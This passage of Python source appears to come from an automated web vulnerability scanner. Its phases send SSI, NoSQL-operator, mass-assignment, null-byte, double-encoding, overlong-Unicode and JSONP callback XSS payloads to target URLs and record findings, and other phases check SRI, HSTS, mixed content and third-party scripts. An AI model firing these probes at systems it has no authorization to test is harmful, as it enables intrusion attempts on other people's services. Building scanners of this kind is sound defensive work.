                        if indicator in body:
                            findings.append(f"[ssi-injection] {test_url} param={param_name} payload={payload}")
                            break
                except urllib.error.HTTPError as e:
                    try:
                        body = e.read().decode("utf-8", errors="ignore")
                        for indicator in _ssi_indicators:
                            if indicator in body:
                                findings.append(f"[ssi-injection] {test_url} param={param_name} payload={payload}")
                                break
                    except Exception:
                        pass
                except Exception:
                    continue
    # Test SSI via headers
    for u in param_urls[:_PIPELINE_CFG.sample_urls_ssi]:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
        for payload in _ssi_payloads:
            await _throttle_rate()
            try:
                head_req = urllib.request.Request(base_url, headers={"User-Agent": payload, **_extra_h})
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, head_req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                for indicator in _ssi_indicators:
                    if indicator in body:
                        findings.append(f"[ssi-header] {base_url} header=User-Agent payload={payload}")
                        break
            except Exception:
                pass
            await _throttle_rate()
            try:
                ref_req = urllib.request.Request(base_url, headers={"User-Agent": "Mozilla/5.0", "Referer": payload, **_extra_h})
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, ref_req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                for indicator in _ssi_indicators:
                    if indicator in body:
                        findings.append(f"[ssi-header] {base_url} header=Referer payload={payload}")
                        break
            except Exception:
                pass
    if not findings:
        findings.append("[ssi] No SSI injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"100-SSI: {len(findings)} findings → {out}")
    return {"100-SSI": str(out), "count": len(findings)}


async def phase_101_JSONINJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"101-JSONINJECT"}:
        return {}
    _out = outdir / "json_injection.txt"
    if _out.exists() and not force:
        return {"101-JSONINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 101-JSONINJECT: JSON/noSQL injection and mass assignment testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "101-JSONINJECT: no URLs; skipping")
        return {"101-JSONINJECT": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    json_urls = [u for u in all_urls if "api" in u.lower() or "/json" in u.lower() or u.endswith(".json") or ".json?" in u]
    if not json_urls:
        json_urls = all_urls
    tested = 0
    for u in json_urls:
        if tested >= _PIPELINE_CFG.sample_urls_jsoninject:
            break
        await _throttle_rate()
        try:
            req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", **_extra_h})
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            is_json = False
            ct = resp_headers.get("content-type", "")
            if "application/json" in ct:
                is_json = True
            if body.strip().startswith(("{", "[")):
                try:
                    json.loads(body)
                    is_json = True
                except (json.JSONDecodeError, ValueError):
                    pass
            if not is_json and "api" not in u.lower() and "/json" not in u.lower():
                continue
            tested += 1
            parsed = urllib.parse.urlparse(u)
            base = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
            nosql_payloads = [
                ('{"key": "value", "admin": true}', "admin"),
                ('{"key": {"$ne": ""}}', "$ne"),
                ('{"key": {"$gt": ""}}', "$gt"),
                ('{"key": {"$regex": ".*"}}', "$regex"),
                ('{"key": {"$where": "1==1"}}', "$where"),
            ]
            for payload_body, operator in nosql_payloads:
                await _throttle_rate()
                try:
                    post_req = urllib.request.Request(
                        base, data=payload_body.encode("utf-8"),
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", **_extra_h},
                        method="POST",
                    )
                    p_status, _, _ = await _async_urlopen(_urlopen, post_req, timeout=10)
                    if p_status in (200, 302):
                        findings.append(f"[nosql-operator] {base} field=body operator={operator}")
                except urllib.error.HTTPError as e:
                    if e.code in (200, 302):
                        findings.append(f"[nosql-operator] {base} field=body operator={operator}")
                except Exception:
                    pass
            mass_assign_fields = ["role", "admin", "is_admin", "user_id"]
            for field in mass_assign_fields:
                payload_body = json.dumps({"key": "value", field: True})
                await _throttle_rate()
                try:
                    post_req = urllib.request.Request(
                        base, data=payload_body.encode("utf-8"),
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", **_extra_h},
                        method="POST",
                    )
                    p_status, _, _ = await _async_urlopen(_urlopen, post_req, timeout=10)
                    if p_status in (200, 302):
                        findings.append(f"[mass-assignment] {base} field={field}")
                except urllib.error.HTTPError as e:
                    if e.code in (200, 302):
                        findings.append(f"[mass-assignment] {base} field={field}")
                except Exception:
                    pass
        except Exception:
            continue
    if not findings:
        findings.append("[jsoninject] No JSON injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"101-JSONINJECT: {len(findings)} findings → {out}")
    return {"101-JSONINJECT": str(out), "count": len(findings)}


async def phase_102_NULLBYTE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"102-NULLBYTE"}:
        return {}
    _out = outdir / "null_byte_injection.txt"
    if _out.exists() and not force:
        return {"102-NULLBYTE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 102-NULLBYTE: null byte injection testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "102-NULLBYTE: no URLs; skipping")
        return {"102-NULLBYTE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    file_params = {"file", "page", "template", "doc", "path", "view", "include", "load"}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    for u in param_urls[:_PIPELINE_CFG.sample_urls_nullbyte]:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in file_params:
                continue
            base_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
            )
            baseline_len = 0
            try:
                req = urllib.request.Request(base_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                baseline_len = len(body_bytes)
            except Exception:
                continue
            if baseline_len == 0:
                continue
            extensions = ["%00", "%00.jpg", "%00.html", "%00.php"]
            for ext in extensions:
                test_qs = qs.copy()
                test_qs[param_name] = [qs[param_name][0] + ext]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                await _throttle_rate()
                try:
                    req2 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    s2, _, b2 = await _async_urlopen(_urlopen, req2, timeout=10)
                    new_len = len(b2)
                    if abs(new_len - baseline_len) > 50:
                        findings.append(
                            f"[null-byte] {test_url} param={param_name} payload={ext} "
                            f"baseline_len={baseline_len} new_len={new_len}"
                        )
                except Exception:
                    continue
    if not findings:
        findings.append("[null-byte] No null byte injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"102-NULLBYTE: {len(findings)} findings → {out}")
    return {"102-NULLBYTE": str(out), "count": len(findings)}


async def phase_103_DOUBLEENCOD(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"103-DOUBLEENCOD"}:
        return {}
    _out = outdir / "double_encoding_bypass.txt"
    if _out.exists() and not force:
        return {"103-DOUBLEENCOD": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 103-DOUBLEENCOD: double encoding bypass testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "103-DOUBLEENCOD: no URLs; skipping")
        return {"103-DOUBLEENCOD": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    payloads = [
        "%252e%252e%252f",
        "%252e%252e/",
        "%252f%252e%252e%252f",
        "%2527",
        "%2522",
    ]
    target_urls = [u for u in all_urls if "/" in urllib.parse.urlparse(u).path.rstrip("/") or "=" in u]
    for u in target_urls[:_PIPELINE_CFG.sample_urls_doubleencod]:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
        )
        baseline_status = 0
        try:
            req = urllib.request.Request(base_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            s0, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            baseline_status = s0
        except urllib.error.HTTPError as e:
            baseline_status = e.code
        except Exception:
            continue
        for payload in payloads:
            encoded_path = parsed.path + "/" + payload if parsed.path else "/" + payload
            test_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, encoded_path, "", "", "")
            )
            await _throttle_rate()
            try:
                req2 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                s2, _, _ = await _async_urlopen_no_redirect(_urlopen, req2, timeout=10)
                if s2 != baseline_status:
                    findings.append(
                        f"[double-encode-bypass] {test_url} payload={payload} "
                        f"baseline_status={baseline_status} new_status={s2}"
                    )
            except urllib.error.HTTPError as e:
                if e.code != baseline_status:
                    findings.append(
                        f"[double-encode-bypass] {test_url} payload={payload} "
                        f"baseline_status={baseline_status} new_status={e.code}"
                    )
            except Exception:
                continue
            if "=" in u:
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                if qs:
                    for param_name in qs:
                        test_qs = qs.copy()
                        test_qs[param_name] = [payload]
                        new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                        param_test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        await _throttle_rate()
                        try:
                            req3 = urllib.request.Request(param_test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s3, _, _ = await _async_urlopen_no_redirect(_urlopen, req3, timeout=10)
                            if s3 != baseline_status:
                                findings.append(
                                    f"[double-encode-bypass] {param_test_url} payload={payload} "
                                    f"baseline_status={baseline_status} new_status={s3}"
                                )
                        except urllib.error.HTTPError as e:
                            if e.code != baseline_status:
                                findings.append(
                                    f"[double-encode-bypass] {param_test_url} payload={payload} "
                                    f"baseline_status={baseline_status} new_status={e.code}"
                                )
                        except Exception:
                            continue
    if not findings:
        findings.append("[double-encode] No double encoding bypass candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"103-DOUBLEENCOD: {len(findings)} findings → {out}")
    return {"103-DOUBLEENCOD": str(out), "count": len(findings)}


async def phase_104_UNICODE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"104-UNICODE"}:
        return {}
    _out = outdir / "unicode_bypass.txt"
    if _out.exists() and not force:
        return {"104-UNICODE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 104-UNICODE: Unicode normalization bypass attacks")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "104-UNICODE: no URLs; skipping")
        return {"104-UNICODE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    overlong_payloads = [
        "%c0%af",
        "%c0%ae",
        "%00",
        "%c0%ae%c0%ae/",
        "%ef%bc%8f%c0%ae%c0%ae/",
    ]
    target_urls = [u for u in all_urls if "=" in u or urllib.parse.urlparse(u).path.strip("/")]
    for u in target_urls[:_PIPELINE_CFG.sample_urls_unicode]:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
        )
        for payload in overlong_payloads:
            test_path = parsed.path.rstrip("/") + "/" + payload.strip("/")
            test_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, test_path, parsed.query, "", "")
            )
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                s, _, b = await _async_urlopen(_urlopen, req, timeout=10)
                body = b.decode("utf-8", errors="ignore")
                hint = ""
                if s == 200:
                    hint = "accessible"
                elif s in (301, 302):
                    hint = "redirect"
                elif s in (403, 401):
                    hint = "blocked"
                if s in (200, 301, 302):
                    findings.append(f"[unicode-bypass] {test_url} payload={payload} response_hint={hint}")
            except urllib.error.HTTPError as e:
                if e.code not in (404, 410):
                    findings.append(f"[unicode-bypass] {test_url} payload={payload} response_hint=HTTP_{e.code}")
            except Exception:
                continue
        if "=" in u:
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if qs:
                for param_name in qs:
                    if param_name.lower() in _SKIP_PARAMS:
                        continue
                    for payload in overlong_payloads:
                        test_qs = qs.copy()
                        test_qs[param_name] = [payload]
                        new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                        param_test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        await _throttle_rate()
                        try:
                            req = urllib.request.Request(param_test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s, _, b = await _async_urlopen(_urlopen, req, timeout=10)
                            body = b.decode("utf-8", errors="ignore")
                            hint = "accessible" if s == 200 else str(s)
                            if s in (200, 301, 302):
                                findings.append(f"[unicode-bypass] {param_test_url} payload={payload} response_hint={hint}")
                        except urllib.error.HTTPError as e:
                            if e.code not in (404, 410):
                                findings.append(f"[unicode-bypass] {param_test_url} payload={payload} response_hint=HTTP_{e.code}")
                        except Exception:
                            continue
    if not findings:
        findings.append("[unicode] No Unicode bypass candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"104-UNICODE: {len(findings)} findings → {out}")
    return {"104-UNICODE": str(out), "count": len(findings)}


async def phase_105_POSTMSGXSS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"105-POSTMSGXSS"}:
        return {}
    _out = outdir / "postmessage_xss.txt"
    if _out.exists() and not force:
        return {"105-POSTMSGXSS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 105-POSTMSGXSS: postMessage XSS detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "105-POSTMSGXSS: no URLs; skipping")
        return {"105-POSTMSGXSS": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    _add_event_re = re.compile(r'addEventListener\s*\(\s*["\']message["\']', re.I)
    _onmessage_re = re.compile(r'window\.onmessage\s*=', re.I)
    _origin_check_re = re.compile(r'event\.origin', re.I)
    _dangerous_re = re.compile(r'\b(eval|innerHTML\s*=|document\.write|location\s*=|src\s*=)', re.I)
    for host in list(hosts)[:_PIPELINE_CFG.sample_hosts_postmsg]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(host, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S | re.I)
            inline_scripts = re.findall(r'onmessage\s*=\s*function[^}]+}', body, re.S | re.I)
            for script_content in script_blocks + inline_scripts:
                has_listener = _add_event_re.search(script_content) or _onmessage_re.search(script_content)
                if not has_listener:
                    continue
                has_origin_check = _origin_check_re.search(script_content)
                has_dangerous = _dangerous_re.search(script_content)
                if not has_origin_check and has_dangerous:
                    findings.append(
                        f"[postmessage-xss] {host} "
                        f"issue=Message handler without origin validation uses dangerous API"
                    )
                elif not has_origin_check:
                    findings.append(
                        f"[postmessage-xss] {host} "
                        f"issue=Message handler missing event.origin validation"
                    )
                if has_origin_check and has_dangerous:
                    star_check = re.search(r'origin\s*[=!]==?\s*["\']\*["\']', script_content)
                    if star_check:
                        findings.append(
                            f"[postmessage-xss] {host} "
                            f"issue=Origin checked against wildcard '*'"
                        )
        except Exception:
            continue
    if not findings:
        findings.append("[postmessage-xss] No vulnerable postMessage handlers found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"105-POSTMSGXSS: {len(findings)} findings → {out}")
    return {"105-POSTMSGXSS": str(out), "count": len(findings)}


async def phase_106_JSONP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"106-JSONP"}:
        return {}
    _out = outdir / "jsonp_endpoints.txt"
    if _out.exists() and not force:
        return {"106-JSONP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 106-JSONP: JSONP endpoint detection and abuse testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "106-JSONP: no URLs; skipping")
        return {"106-JSONP": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    callback_params = ["callback", "jsonp", "cb", "call", "jsonpcallback"]
    _jsonp_re = re.compile(r'^\s*(?:/\*\*/)?\s*test\s*\((.*)\)\s*;?\s*$', re.S | re.DOTALL)
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    xss_callbacks = ["alert(1)//", "<script>alert(1)</script>//"]
    for base_host in list(hosts)[:_PIPELINE_CFG.sample_hosts_jsonp]:
        for cp in callback_params:
            test_url = f"{base_host}/?{cp}=test"
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                if _jsonp_re.match(body):
                    findings.append(f"[jsonp-detected] {base_host} callback_param={cp}")
                    for xss_cb in xss_callbacks:
                        xss_url = f"{base_host}/?{cp}={urllib.parse.quote(xss_cb)}"
                        try:
                            req2 = urllib.request.Request(xss_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s2, _, b2 = await _async_urlopen(_urlopen, req2, timeout=10)
                            b2_body = b2.decode("utf-8", errors="ignore")
                            if xss_cb.replace("//", "") in b2_body and "alert" in b2_body:
                                findings.append(f"[jsonp-xss] {xss_url} payload={xss_cb}")
                        except Exception:
                            continue
            except Exception:
                continue
    if not findings:
        findings.append("[jsonp] No JSONP endpoints detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"106-JSONP: {len(findings)} findings → {out}")
    return {"106-JSONP": str(out), "count": len(findings)}


async def phase_107_SRI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"107-SRI"}:
        return {}
    _out = outdir / "sri_findings.txt"
    if _out.exists() and not force:
        return {"107-SRI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 107-SRI: subresource integrity check")
    hosts_f = outdir / "hosts.txt"
    all_hosts = read_lines(hosts_f) if hosts_f.exists() else []
    if not all_hosts:
        log("warn", "107-SRI: no hosts; skipping")
        return {"107-SRI": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    _script_src_re = re.compile(r'<script[^>]*src=["\']([^"\']+)["\']', re.I)
    _link_stylesheet_re = re.compile(r'<link[^>]*rel=["\']stylesheet["\'][^>]*href=["\']([^"\']+)["\']', re.I)
    _integrity_re = re.compile(r'\bintegrity\s*=', re.I)
    for host_entry in all_hosts[:_PIPELINE_CFG.sample_hosts_sri]:
        host = host_entry.strip()
        if not host:
            continue
        if not host.startswith("http"):
            host = "https://" + host
        await _throttle_rate()
        try:
            req = urllib.request.Request(host, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            script_srcs = _script_src_re.findall(body)
            link_hrefs = _link_stylesheet_re.findall(body)
            parsed_host = urllib.parse.urlparse(host)
            host_domain = parsed_host.netloc.lower()
            for src in script_srcs:
                src_parsed = urllib.parse.urlparse(src)
                if not src_parsed.netloc:
                    continue
                src_domain = src_parsed.netloc.lower()
                if src_domain == host_domain or src_domain.endswith("." + host_domain):
                    continue
                start = body.find(f'src="{src}"')
                if start == -1:
                    start = body.find(f"src='{src}'")
                if start == -1:
                    continue
                snippet_start = max(0, start - 200)
                snippet = body[snippet_start:start + len(src) + 50]
                has_integrity = bool(_integrity_re.search(snippet))
                if has_integrity:
                    findings.append(f"[sri-present] {host} external_src={src}")
                else:
                    findings.append(f"[sri-missing] {host} external_src={src}")
            for href in link_hrefs:
                href_parsed = urllib.parse.urlparse(href)
                if not href_parsed.netloc:
                    continue
                href_domain = href_parsed.netloc.lower()
                if href_domain == host_domain or href_domain.endswith("." + host_domain):
                    continue
                start = body.find(f'href="{href}"')
                if start == -1:
                    start = body.find(f"href='{href}'")
                if start == -1:
                    continue
                snippet_start = max(0, start - 200)
                snippet = body[snippet_start:start + len(href) + 50]
                has_integrity = bool(_integrity_re.search(snippet))
                if has_integrity:
                    findings.append(f"[sri-present] {host} external_src={href}")
                else:
                    findings.append(f"[sri-missing] {host} external_src={href}")
        except Exception:
            continue
    if not findings:
        findings.append("[sri] No external resources detected or no SRI issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"107-SRI: {len(findings)} findings → {out}")
    return {"107-SRI": str(out), "count": len(findings)}
async def phase_108_MIXEDCONTENT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"108-MIXEDCONTENT"}:
        return {}
    _out = outdir / "mixed_content.txt"
    if _out.exists() and not force:
        return {"108-MIXEDCONTENT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 108-MIXEDCONTENT: Mixed content detection")
    findings: List[str] = []
    _mc_urlopen = _get_urlopener()
    _mc_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "108-MIXEDCONTENT: no hosts; skipping")
        return {"108-MIXEDCONTENT": str(_out), "count": 0}
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_mixedcontent', 20)
    for host in hosts[:sample]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://",):
            url = f"{scheme}{host_clean}/"
            try:
                req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_mc_extra_headers})
                s, _, body_bytes = await _async_urlopen(_mc_urlopen, req, timeout=10)
                if s != 200:
                    continue
                body = body_bytes.decode("utf-8", errors="ignore")
                active_patterns = [
                    r'<script[^>]*src=["\']http://([^"\']+)["\']',
                    r'<iframe[^>]*src=["\']http://([^"\']+)["\']',
                    r'<link[^>]*href=["\']http://([^"\']+)["\'][^>]*stylesheet',
                    r'<object[^>]*data=["\']http://([^"\']+)["\']',
                    r'<embed[^>]*src=["\']http://([^"\']+)["\']',
                ]
                passive_patterns = [
                    r'<img[^>]*src=["\']http://([^"\']+)["\']',
                    r'background-image:\s*url\(["\']?http://([^)"\']+)',
                    r'<img[^>]*srcset=["\']http://([^"\']+)["\']',
                    r'<source[^>]*src=["\']http://([^"\']+)["\']',
                    r'<video[^>]*src=["\']http://([^"\']+)["\']',
                    r'<audio[^>]*src=["\']http://([^"\']+)["\']',
                ]
                for pat in active_patterns:
                    for m in re.finditer(pat, body, re.I):
                        findings.append(f"[mixed-active] {host_clean} resource=http://{m.group(1)}")
                for pat in passive_patterns:
                    for m in re.finditer(pat, body, re.I):
                        findings.append(f"[mixed-passive] {host_clean} resource=http://{m.group(1)}")
            except Exception:
                continue
    if not findings:
        findings.append("[mixedcontent] No mixed content found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"108-MIXEDCONTENT: {len(findings)} findings → {out}")
    return {"108-MIXEDCONTENT": str(out), "count": len(findings)}


async def phase_109_HSTSPRELOAD(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"109-HSTSPRELOAD"}:
        return {}
    _out = outdir / "hsts_preload.txt"
    if _out.exists() and not force:
        return {"109-HSTSPRELOAD": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 109-HSTSPRELOAD: HSTS preload list check")
    findings: List[str] = []
    _hp_urlopen = _get_urlopener()
    _hp_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "109-HSTSPRELOAD: no hosts; skipping")
        return {"109-HSTSPRELOAD": str(_out), "count": 0}
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_hstspreload', 20)
    for host in hosts[:sample]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://",):
            url = f"{scheme}{host_clean}/"
            try:
                req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_hp_extra_headers})
                s, headers, _ = await _async_urlopen(_hp_urlopen, req, timeout=10)
                if s not in (200, 301, 302, 307, 308):
                    continue
                hsts = headers.get("Strict-Transport-Security", "")
                if not hsts:
                    findings.append(f"[hsts-missing] {host_clean}")
                else:
                    max_age_m = re.search(r'max-age=(\d+)', hsts, re.I)
                    max_age = int(max_age_m.group(1)) if max_age_m else 0
                    has_include = "includesubdomains" in hsts.lower().replace(" ", "")
                    if max_age >= 31536000 and has_include:
                        try:
                            preload_req = urllib.request.Request(
                                f"https://hstspreload.org/api/v2/status?domain={host_clean}",
                                headers={"User-Agent": "Mozilla/5.0"},
                            )
                            ps, _, pb = await _async_urlopen(_hp_urlopen, preload_req, timeout=10)
                            if ps == 200:
                                preload_data = json.loads(pb.decode("utf-8", errors="ignore"))
                                if preload_data.get("status") == "preloaded":
                                    findings.append(f"[hsts-preloaded] {host_clean}")
                        except Exception:
                            pass
                    elif max_age < 31536000 or not has_include:
                        findings.append(
                            f"[hsts-insufficient] {host_clean} max-age={max_age} includeSubDomains={str(has_include).lower()}"
                        )
                break
            except Exception:
                continue
    if not findings:
        findings.append("[hsts] No HSTS issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"109-HSTSPRELOAD: {len(findings)} findings → {out}")
    return {"109-HSTSPRELOAD": str(out), "count": len(findings)}


async def phase_110_THIRDPARTYJS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"110-THIRDPARTYJS"}:
        return {}
    _out = outdir / "third_party_js.txt"
    if _out.exists() and not force:
        return {"110-THIRDPARTYJS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 110-THIRDPARTYJS: Third-party JavaScript risk analysis")
    findings: List[str] = []
    _tj_urlopen = _get_urlopener()
    _tj_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "110-THIRDPARTYJS: no hosts; skipping")
        return {"110-THIRDPARTYJS": str(_out), "count": 0}
    tracker_map = {
        "googletagmanager.com": "Google Tag Manager",
        "google-analytics.com": "Google Analytics",
        "googlesyndication.com": "Google Ads",
        "facebook.net": "Facebook Pixel",
        "connect.facebook.net": "Facebook Pixel",
        "hotjar.com": "Hotjar",
        "nr-data.net": "New Relic",
        "js-agent.newrelic.com": "New Relic",
        "cdn.ampproject.org": "AMP",
        "cdn.onesignal.com": "OneSignal",
        "cdn.segment.com": "Segment",
        "cdn.segment.io": "Segment",
        "cdn.jsdelivr.net": "jsDelivr CDN",
        "cdnjs.cloudflare.com": "Cloudflare CDN",
        "unpkg.com": "unpkg CDN",
    }
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_thirdpartyjs', 15)
    for host in hosts[:sample]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://",):
            url = f"{scheme}{host_clean}/"
            try:
                req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_tj_extra_headers})
                s, _, body_bytes = await _async_urlopen(_tj_urlopen, req, timeout=10)
                if s != 200:
                    continue
                body = body_bytes.decode("utf-8", errors="ignore")
                script_tags = re.findall(r'(<script[^>]+>)', body, re.I)
                for stag in script_tags:
                    src_m = re.search(r'src=["\']([^"\']+)["\']', stag, re.I)
                    if not src_m:
                        continue
                    src = src_m.group(1).strip()
                    if not src.startswith("http"):
                        if src.startswith("//"):
                            src = "https:" + src
                        else:
                            src = urllib.parse.urljoin(url, src)
                    src_host = urllib.parse.urlparse(src).hostname or ""
                    if src_host != host_clean and not src_host.endswith("." + host_clean):
                        tracker_name = "unknown"
                        for tdom, tname in tracker_map.items():
                            if tdom in src_host:
